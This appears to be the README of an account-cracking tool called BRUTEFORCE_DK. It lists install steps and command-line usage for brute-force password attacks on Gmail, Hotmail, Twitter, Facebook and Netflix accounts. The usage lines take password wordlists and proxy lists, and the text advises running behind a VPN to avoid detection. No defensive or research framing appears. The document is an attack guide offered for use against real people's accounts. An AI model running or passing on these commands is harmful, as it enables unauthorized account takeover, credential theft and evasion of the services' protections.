#BRUTEFORCE_DK
install :
sudo apt install python3 python3-pip

pip3 install proxylist

pip3 install mechanize
Usage:
BruteForce Gmail Attack
python3 Brute_Force.py -g Account@gmail.com -l File_list

python3 Brute_Force.py -g Account@gmail.com -p Password_Single
BruteForce Hotmail Attack
python3 Brute_Force.py -t Account@hotmail.com -l File_list

python3 Brute_Force.py -t Account@hotmail.com -p Password_Single
BruteForce Twitter Attack
python3 Brute_Force.py -T Account_Twitter -l File_list
python3 Brute_Force.py -T Account_Twitter -l File_list -X proxy-list.txt
BruteForce Facebook Attack
python3 Brute_Force.py -f Account_facebook -l File_list
python3 Brute_Force.py -f Account_facebook -l File_list -X proxy-list.tx

BruteForce Netflix Attack
USE VPN
Start On Vpn
python3 Brute_Force.py -n Account_Netflix -l File_list
python3 Brute_Force.py -n Account_Netflix -l File_list -X proxy-list.list
